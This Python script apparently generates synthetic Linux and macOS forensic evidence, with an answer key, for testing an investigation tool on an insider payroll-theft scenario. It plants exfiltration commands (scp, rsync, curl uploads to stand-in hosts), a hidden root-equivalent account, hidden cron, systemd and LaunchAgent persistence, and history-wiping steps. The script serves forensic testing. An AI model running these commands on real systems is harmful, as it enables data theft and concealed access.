"""Linux and macOS evidence for the scenario (scripts/test-image/make-test-image.sh puts the Linux tree on an ext4 disk
with mke2fs -d and the macOS tree in a TAR collection).

Linux, build-01 (Ubuntu 24.04, US Eastern): on 1 September 2026 someone tries root's password over SSH three times
(18:02 UTC), then alice logs in with her key from 198.51.100.23 (18:05:12), adds a second root account `sysupdate`
with sudo (18:07:40), copies payroll.csv to dmitri@203.0.113.50 with scp, shreds it and clears her history; the
SanDisk stick from the laptop is plugged in at 18:12:44. A cron job and a systemd service run hidden programs.
macOS, Alice's MacBook Pro: Safari downloads SecureDelete-mac.dmg (quarantined), the Mac joins the Wi-Fi of the
competitor's office, a LaunchAgent starts a hidden helper, and zsh history shows the payroll upload.

Usage: make_unix.py LINUX_TREE MAC_TREE. Every value the tests check is in EXPECTED (written to unix-expected.json).
"""
import gzip
import json
import os
import plistlib
import shutil
import sqlite3
import struct
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path
from zoneinfo import ZoneInfo

UTC = timezone.utc
EASTERN = ZoneInfo('America/New_York')
SANDISK_SERIAL = '4C530001230518109141'  # the laptop's SanDisk Cruzer Blade (make_artifacts.py)
MAC_EPOCH = datetime(2001, 1, 1, tzinfo=UTC)


def utc(*a):
    return datetime(*a, tzinfo=UTC)


def write(root: Path, rel: str, data, when: datetime | None = None, mode=0o644):
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(data.encode() if isinstance(data, str) else data)
    p.chmod(mode)
    if when:
        os.utime(p, (when.timestamp(), when.timestamp()))
    return p


def syslog_line(when: datetime, host: str, prog: str, msg: str) -> str:
    """Traditional syslog: local time without a year."""
    t = when.astimezone(EASTERN)
    return f'{t:%b} {t.day:2d} {t:%H:%M:%S} {host} {prog}: {msg}'


def rfc3339_line(when: datetime, host: str, prog: str, msg: str) -> str:
    t = when.astimezone(EASTERN)
    return f'{t.isoformat(timespec="microseconds")} {host} {prog}: {msg}'


def utmp(typ, pid, line, user, host, when: datetime) -> bytes:
    rec = bytearray(384)
    struct.pack_into('<hxxi', rec, 0, typ, pid)
    rec[8:8 + len(line)] = line.encode()
    rec[40:44] = line[-4:].encode().ljust(4, b'\0')[:4]
    rec[44:44 + len(user)] = user.encode()
    rec[76:76 + len(host)] = host.encode()
    struct.pack_into('<ii', rec, 340, int(when.timestamp()), when.microsecond)
    return bytes(rec)


FAILED = [utc(2026, 9, 1, 18, 2, 10), utc(2026, 9, 1, 18, 2, 14), utc(2026, 9, 1, 18, 2, 19)]
LOGIN, LOGOUT = utc(2026, 9, 1, 18, 5, 12), utc(2026, 9, 1, 18, 31, 40)
BOOT = utc(2026, 9, 1, 13, 0, 5)
SUDO = utc(2026, 9, 1, 18, 7, 40)
USB = utc(2026, 9, 1, 18, 12, 44)
CRON = [utc(2026, 9, 1, 18, 15, 0), utc(2026, 9, 1, 18, 30, 0)]
OLD_LOGIN = utc(2026, 8, 30, 13, 40, 2)
HISTORY = [  # (time, command) alice ran on build-01
    (utc(2026, 9, 1, 18, 5, 30), 'ls -la ~/exports'),
    (utc(2026, 9, 1, 18, 7, 38), 'sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupdate'),
    (utc(2026, 9, 1, 18, 9, 2), 'scp ~/exports/payroll.csv dmitri@203.0.113.50:/srv/drop/'),
    (utc(2026, 9, 1, 18, 10, 11), 'shred -u ~/exports/payroll.csv'),
    (utc(2026, 9, 1, 18, 31, 20), 'history -c'),
]
XBEL_OPENED = utc(2026, 9, 1, 18, 6, 10)
FIREFOX_VISIT = utc(2026, 9, 1, 18, 20, 4)

EXPECTED = {
    'linux': {
        'hostname': 'build-01', 'os': 'Ubuntu 24.04.1 LTS', 'zone': 'America/New_York',
        'accounts': {'root': 0, 'alice': 1000, 'bob': 1001, 'sysupdate': 0, 'backup': 34},
        'uid0_extra': ['sysupdate'],
        'history': [c for _, c in HISTORY],
        'flagged_commands': {'scp ~/exports/payroll.csv dmitri@203.0.113.50:/srv/drop/': 'EXFIL',
                             'shred -u ~/exports/payroll.csv': 'ANTI_FORENSICS', 'history -c': 'ANTI_FORENSICS',
                             'sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupdate': 'PRIVILEGE'},
        'ssh_login': {'user': 'alice', 'ip': '198.51.100.23', 'time': LOGIN.isoformat()},
        'ssh_failed': [t.isoformat() for t in FAILED],
        'old_login': OLD_LOGIN.isoformat(),
        'sudo_time': SUDO.isoformat(), 'usb_time': USB.isoformat(), 'usb_serial': SANDISK_SERIAL,
        'session': {'login': LOGIN.isoformat(), 'logout': LOGOUT.isoformat(), 'host': '198.51.100.23'},
        'boot': BOOT.isoformat(),
        'jobs_flagged': ['/opt/.cache/sync.sh', '/tmp/.x/update --daemon'],
        'recent': {'path': '/home/alice/exports/payroll.csv', 'app': 'LibreOffice Calc', 'time': XBEL_OPENED.isoformat()},
        'firefox': {'url': 'https://filetransfer.example.net/upload', 'time': FIREFOX_VISIT.isoformat()},
    },
}


def linux(root: Path):
    root.mkdir(parents=True, exist_ok=True)
    host = 'build-01'
    write(root, 'etc/hostname', host + '\n')
    write(root, 'etc/os-release', 'PRETTY_NAME="Ubuntu 24.04.1 LTS"\nNAME="Ubuntu"\nVERSION_ID="24.04"\nVERSION="24.04.1 LTS (Noble Numbat)"\n'
          'ID=ubuntu\nID_LIKE=debian\n')
    write(root, 'etc/timezone', 'America/New_York\n')
    shutil.copyfile('/usr/share/zoneinfo/America/New_York', root / 'etc/localtime')
    write(root, 'etc/passwd', 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n'
          'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\n'
          'alice:x:1000:1000:Alice Example,,,:/home/alice:/bin/bash\nbob:x:1001:1001:Bob Builder,,,:/home/bob:/bin/bash\n'
          'sysupdate:x:0:0::/root:/bin/bash\n', SUDO)
    write(root, 'etc/group', 'root:x:0:\nsudo:x:27:alice\nalice:x:1000:\nbob:x:1001:\ndocker:x:999:alice,bob\n')
    write(root, 'etc/shadow', 'root:!:20300:0:99999:7:::\nalice:$6$placeholder$notarealhash:20321:0:99999:7:::\n'
          'bob:$6$placeholder$notarealhash:20100:0:99999:7:::\nsysupdate:$6$placeholder$notarealhash:20332:0:99999:7:::\n', SUDO, 0o640)
    # Logs: auth.log in traditional syslog format (local time, no year); syslog in RFC 3339 (with its offset).
    auth = [syslog_line(OLD_LOGIN, host, 'sshd[1012]', 'Accepted password for alice from 198.51.100.23 port 50211 ssh2')]
    write(root, 'var/log/auth.log.2.gz', gzip.compress(('\n'.join(auth) + '\n').encode(), mtime=0), OLD_LOGIN)
    auth = [syslog_line(t, host, 'sshd[2101]', f'Failed password for root from 203.0.113.99 port {40000 + i} ssh2') for i, t in enumerate(FAILED)]
    auth += [syslog_line(LOGIN, host, 'sshd[2130]', 'Accepted publickey for alice from 198.51.100.23 port 52344 ssh2: ED25519 SHA256:x1y2'),
             syslog_line(LOGIN, host, 'sshd[2130]', 'pam_unix(sshd:session): session opened for user alice(uid=1000) by alice(uid=0)'),
             syslog_line(SUDO, host, 'sudo', '   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/sbin/useradd -o -u 0 -g 0 -M -d /root '
                                              '-s /bin/bash sysupdate'),
             syslog_line(SUDO, host, 'useradd[2214]', 'new user: name=sysupdate, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/0'),
             syslog_line(LOGOUT, host, 'sshd[2130]', 'pam_unix(sshd:session): session closed for user alice')]
    write(root, 'var/log/auth.log', '\n'.join(auth) + '\n', LOGOUT, 0o640)
    sys_lines = [rfc3339_line(BOOT, host, 'systemd[1]', 'Started sysupdate.service - System update daemon.'),
                 rfc3339_line(USB, host, 'kernel', '[ 3211.123456] usb 1-1: New USB device found, idVendor=0781, idProduct=5567, bcdDevice= 1.00'),
                 rfc3339_line(USB, host, 'kernel', '[ 3211.123467] usb 1-1: Product: Cruzer Blade'),
                 rfc3339_line(USB, host, 'kernel', f'[ 3211.123478] usb 1-1: SerialNumber: {SANDISK_SERIAL}')]
    sys_lines += [rfc3339_line(t, host, f'CRON[{2300 + i}]', '(root) CMD (/opt/.cache/sync.sh)') for i, t in enumerate(CRON)]
    write(root, 'var/log/syslog', '\n'.join(sys_lines) + '\n', CRON[-1], 0o640)
    write(root, 'var/log/wtmp', utmp(2, 0, '~', 'reboot', '6.8.0-41-generic', BOOT) + utmp(7, 2130, 'pts/0', 'alice', '198.51.100.23', LOGIN)
          + utmp(8, 2130, 'pts/0', '', '', LOGOUT), LOGOUT)
    write(root, 'var/log/btmp', b''.join(utmp(6, 2101, 'ssh:notty', 'root', '203.0.113.99', t) for t in FAILED), FAILED[-1], 0o600)
    # Shell history (HISTTIMEFORMAT was set, so bash wrote the times), cron, a service, a key.
    write(root, 'home/alice/.bash_history', ''.join(f'#{int(t.timestamp())}\n{c}\n' for t, c in HISTORY), HISTORY[-1][0], 0o600)
    write(root, 'root/.bash_history', 'systemctl enable sysupdate.service\ncrontab -l\n', BOOT, 0o600)
    write(root, 'etc/cron.d/sync', 'SHELL=/bin/sh\n# keep the mirror current\n*/15 * * * * root /opt/.cache/sync.sh\n', BOOT)
    write(root, 'etc/crontab', 'SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n', BOOT)
    write(root, 'var/spool/cron/crontabs/alice', '# m h dom mon dow command\n@reboot /usr/bin/true\n', BOOT, 0o600)
    write(root, 'opt/.cache/sync.sh', '#!/bin/sh\nrsync -a /home/alice/exports/ dmitri@203.0.113.50:/srv/drop/\n', BOOT, 0o755)
    write(root, 'etc/systemd/system/sysupdate.service', '[Unit]\nDescription=System update daemon\n\n[Service]\nExecStart=/tmp/.x/update --daemon\n'
          'Restart=always\n\n[Install]\nWantedBy=multi-user.target\n', BOOT)
    (root / 'etc/systemd/system/multi-user.target.wants').mkdir(parents=True, exist_ok=True)
    os.symlink('/etc/systemd/system/sysupdate.service', root / 'etc/systemd/system/multi-user.target.wants/sysupdate.service')
    write(root, 'etc/systemd/system/backup.service', '[Unit]\nDescription=Nightly backup\n\n[Service]\nExecStart=/usr/local/bin/backup.sh\nUser=backup\n', BOOT)
    write(root, 'home/alice/.ssh/authorized_keys', 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMkA1ice0Key0For0Test0Only alice@laptop-07\n', BOOT, 0o600)
    write(root, 'home/alice/.local/share/recently-used.xbel', f'''<?xml version="1.0" encoding="UTF-8"?>
<xbel version="1.0" xmlns:bookmark="http://www.freedesktop.org/standards/desktop-bookmarks" xmlns:mime="http://www.freedesktop.org/standards/shared-mime-info">
  <bookmark href="file:///home/alice/exports/payroll.csv" added="{XBEL_OPENED.isoformat().replace('+00:00', 'Z')}" modified="{XBEL_OPENED.isoformat().replace('+00:00', 'Z')}" visited="{XBEL_OPENED.isoformat().replace('+00:00', 'Z')}">
    <info><metadata owner="http://freedesktop.org"><mime:mime-type type="text/csv"/>
      <bookmark:applications><bookmark:application name="LibreOffice Calc" exec="&apos;soffice --calc %u&apos;" modified="{XBEL_OPENED.isoformat().replace('+00:00', 'Z')}" count="1"/></bookmark:applications>
    </metadata></info>
  </bookmark>
</xbel>
''', XBEL_OPENED)
    places = root / 'home/alice/.mozilla/firefox/k9x2.default-release/places.sqlite'
    places.parent.mkdir(parents=True, exist_ok=True)
    db = sqlite3.connect(places)
    db.executescript("""CREATE TABLE moz_places(id INTEGER PRIMARY KEY, url LONGVARCHAR, title LONGVARCHAR, rev_host LONGVARCHAR,
                        visit_count INTEGER DEFAULT 0, hidden INTEGER DEFAULT 0 NOT NULL, typed INTEGER DEFAULT 0 NOT NULL,
                        frecency INTEGER DEFAULT -1 NOT NULL, last_visit_date INTEGER, guid TEXT);
                        CREATE TABLE moz_anno_attributes(id INTEGER PRIMARY KEY, name VARCHAR(32) UNIQUE NOT NULL);
                        CREATE TABLE moz_annos(id INTEGER PRIMARY KEY, place_id INTEGER NOT NULL, anno_attribute_id INTEGER, content LONGVARCHAR,
                        flags INTEGER DEFAULT 0, expiration INTEGER DEFAULT 0, type INTEGER DEFAULT 0, dateAdded INTEGER DEFAULT 0,
                        lastModified INTEGER DEFAULT 0);""")
    db.execute('INSERT INTO moz_places(id,url,title,visit_count,last_visit_date) VALUES (1,?,?,1,?)',
               ('https://filetransfer.example.net/upload', 'Anonymous File Upload', int(FIREFOX_VISIT.timestamp() * 1_000_000)))
    db.commit()
    db.close()
    os.utime(places, (FIREFOX_VISIT.timestamp(), FIREFOX_VISIT.timestamp()))
    (root / 'home/alice/exports').mkdir(parents=True, exist_ok=True)
    write(root, 'home/alice/exports/README', 'Exports for the finance team. Do not copy elsewhere.\n', utc(2026, 8, 20, 9, 0))


# ------------------------------------------------------------------------------------------------ macOS
MAC = {
    'computer_name': 'Alice’s MacBook Pro', 'local_host': 'Alices-MacBook-Pro', 'version': '14.6.1', 'build': '23G93',
    'download': {'url': 'https://tools.example.org/securedelete/SecureDelete-mac.dmg', 'path': '~/Downloads/SecureDelete-mac.dmg',
                 'added': utc(2026, 9, 2, 13, 4, 11), 'finished': utc(2026, 9, 2, 13, 4, 19), 'bytes': 1834291},
    'quarantine': [(utc(2026, 9, 2, 13, 4, 19), 'com.apple.Safari', 'Safari', 'https://tools.example.org/securedelete/SecureDelete-mac.dmg',
                    'https://tools.example.org/securedelete/', None),
                   (utc(2026, 9, 2, 13, 20, 2), 'com.apple.mail', 'Mail', None, None, 'dmitri.k.rival@protonmail.example')],
    'visits': [('https://tools.example.org/securedelete/', 'SecureDelete for Mac', utc(2026, 9, 2, 13, 3, 58)),
               ('https://filetransfer.example.net/upload', 'Anonymous File Upload', utc(2026, 9, 2, 13, 30, 41)),
               ('https://filetransfer.example.net/upload', 'Anonymous File Upload', utc(2026, 9, 2, 13, 31, 2))],
    'wifi': [('CorpNet', 'WPA2 Enterprise', utc(2025, 4, 1, 8, 0), utc(2026, 9, 1, 12, 0, 3)),
             ('Rival-Guest', 'WPA2 Personal', utc(2026, 9, 2, 15, 47, 30), utc(2026, 9, 2, 15, 47, 31))],
    'zsh': [(utc(2026, 9, 2, 13, 29, 50), 'cd ~/Desktop'),
            (utc(2026, 9, 2, 13, 30, 5), 'curl -T payroll-export.csv https://filetransfer.example.net/upload'),
            (utc(2026, 9, 2, 13, 31, 40), 'rm ~/.zsh_sessions/*')],
    'agent': ['/Users/Shared/.helper/helper', '--sync'],
}
EXPECTED['macos'] = {
    'computer_name': MAC['computer_name'], 'os': f'macOS {MAC["version"]}', 'build': MAC['build'], 'zone': 'America/New_York',
    'accounts': {'alice': 501}, 'admins': ['alice'],
    'download': {'url': MAC['download']['url'], 'start': MAC['download']['added'].isoformat()},
    'quarantine': [{'time': t.isoformat(), 'agent': a, 'url': u, 'sender': s} for t, _, a, u, _, s in MAC['quarantine']],
    'history': {'https://tools.example.org/securedelete/': MAC['visits'][0][2].isoformat(),
                'https://filetransfer.example.net/upload': MAC['visits'][2][2].isoformat()},
    'wifi': {s: j.isoformat() for s, _, _, j in MAC['wifi']},
    'zsh': [c for _, c in MAC['zsh']],
    'agent': ' '.join(MAC['agent']),
}


def mac_abs(t: datetime) -> float:
    return (t - MAC_EPOCH).total_seconds()


def macos(root: Path):
    root.mkdir(parents=True, exist_ok=True)
    b = lambda d: plistlib.dumps(d, fmt=plistlib.FMT_BINARY)
    x = lambda d: plistlib.dumps(d, fmt=plistlib.FMT_XML)
    write(root, 'System/Library/CoreServices/SystemVersion.plist', x({'ProductName': 'macOS', 'ProductVersion': MAC['version'],
                                                                     'ProductBuildVersion': MAC['build']}))
    write(root, 'Library/Preferences/SystemConfiguration/preferences.plist', b({
        'System': {'System': {'ComputerName': MAC['computer_name'], 'ComputerNameEncoding': 0},
                   'Network': {'HostNames': {'LocalHostName': MAC['local_host']}}}}))
    write(root, 'private/var/db/dslocal/nodes/Default/users/alice.plist', b({
        'name': ['alice'], 'uid': ['501'], 'gid': ['20'], 'realname': ['Alice Example'], 'home': ['/Users/alice'], 'shell': ['/bin/zsh'],
        'generateduid': ['6F1C2A0E-2B6B-4D85-9C3E-0D1B7E2C9A11']}))
    write(root, 'private/var/db/dslocal/nodes/Default/users/_spotlight.plist', b({'name': ['_spotlight'], 'uid': ['89'], 'gid': ['89'],
                                                                                   'home': ['/var/empty'], 'shell': ['/usr/bin/false']}))
    write(root, 'private/var/db/dslocal/nodes/Default/groups/admin.plist', b({'name': ['admin'], 'gid': ['80'], 'users': ['root', 'alice']}))
    write(root, 'Users/alice/.zsh_history', ''.join(f': {int(t.timestamp())}:0;{c}\n' for t, c in MAC['zsh']), MAC['zsh'][-1][0], 0o600)
    hist = root / 'Users/alice/Library/Safari/History.db'
    hist.parent.mkdir(parents=True, exist_ok=True)
    db = sqlite3.connect(hist)
    db.executescript('CREATE TABLE history_items(id INTEGER PRIMARY KEY, url TEXT NOT NULL UNIQUE, domain_expansion TEXT, visit_count INTEGER);'
                     'CREATE TABLE history_visits(id INTEGER PRIMARY KEY, history_item INTEGER, visit_time REAL, title TEXT);')
    items = {}
    for url, title, t in MAC['visits']:
        if url not in items:
            items[url] = len(items) + 1
            db.execute('INSERT INTO history_items(id, url, visit_count) VALUES (?,?,0)', (items[url], url))
        db.execute('UPDATE history_items SET visit_count = visit_count + 1 WHERE id = ?', (items[url],))
        db.execute('INSERT INTO history_visits(history_item, visit_time, title) VALUES (?,?,?)', (items[url], mac_abs(t), title))
    db.commit()
    db.close()
    d = MAC['download']
    write(root, 'Users/alice/Library/Safari/Downloads.plist', b({'DownloadHistory': [{
        'DownloadEntryURL': d['url'], 'DownloadEntryPath': d['path'], 'DownloadEntryDateAddedKey': d['added'].replace(tzinfo=None),
        'DownloadEntryDateFinishedKey': d['finished'].replace(tzinfo=None), 'DownloadEntryProgressTotalToLoad': d['bytes']}]}), d['finished'])
    q = root / 'Users/alice/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2'
    q.parent.mkdir(parents=True, exist_ok=True)
    db = sqlite3.connect(q)
    db.execute('CREATE TABLE LSQuarantineEvent (LSQuarantineEventIdentifier TEXT PRIMARY KEY NOT NULL, LSQuarantineTimeStamp REAL, '
               'LSQuarantineAgentBundleIdentifier TEXT, LSQuarantineAgentName TEXT, LSQuarantineDataURLString TEXT, LSQuarantineSenderName TEXT, '
               'LSQuarantineSenderAddress TEXT, LSQuarantineTypeNumber INTEGER, LSQuarantineOriginTitle TEXT, LSQuarantineOriginURLString TEXT, '
               'LSQuarantineOriginAlias BLOB)')
    for i, (t, bundle, agent, url, origin, sender) in enumerate(MAC['quarantine']):
        db.execute('INSERT INTO LSQuarantineEvent VALUES (?,?,?,?,?,?,?,?,?,?,?)',
                   (f'5D1A9C3E-0000-4000-8000-00000000000{i}', mac_abs(t), bundle, agent, url, None, sender, 0, None, origin, None))
    db.commit()
    db.close()
    write(root, 'Library/Preferences/com.apple.wifi.known-networks.plist', b({
        f'wifi.network.ssid.{s}': {'SSID': s.encode(), 'SupportedSecurityTypes': sec, 'AddedAt': added.replace(tzinfo=None),
                                   'JoinedByUserAt': joined.replace(tzinfo=None)} for s, sec, added, joined in MAC['wifi']}))
    write(root, 'Library/LaunchAgents/com.sync.helper.plist', x({'Label': 'com.sync.helper', 'ProgramArguments': MAC['agent'],
                                                                 'RunAtLoad': True, 'KeepAlive': True}))
    write(root, 'Users/alice/Library/LaunchAgents/com.google.keystone.agent.plist', x({
        'Label': 'com.google.keystone.user.agent', 'ProgramArguments': ['/Users/alice/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/'
                                                                        'Contents/Resources/GoogleSoftwareUpdateAgent.app/Contents/MacOS/GoogleSoftwareUpdateAgent',
                                                                        '-runMode', 'ifneeded'], 'StartInterval': 3600}))
    (root / 'private/etc').mkdir(parents=True, exist_ok=True)
    os.symlink('/var/db/timezone/zoneinfo/America/New_York', root / 'private/etc/localtime')
    os.symlink('private/etc', root / 'etc')


if __name__ == '__main__':
    linux(Path(sys.argv[1]))
    macos(Path(sys.argv[2]))
    Path(sys.argv[3]).write_text(json.dumps(EXPECTED, indent=1, default=str))
    print('Built the Linux and macOS trees')
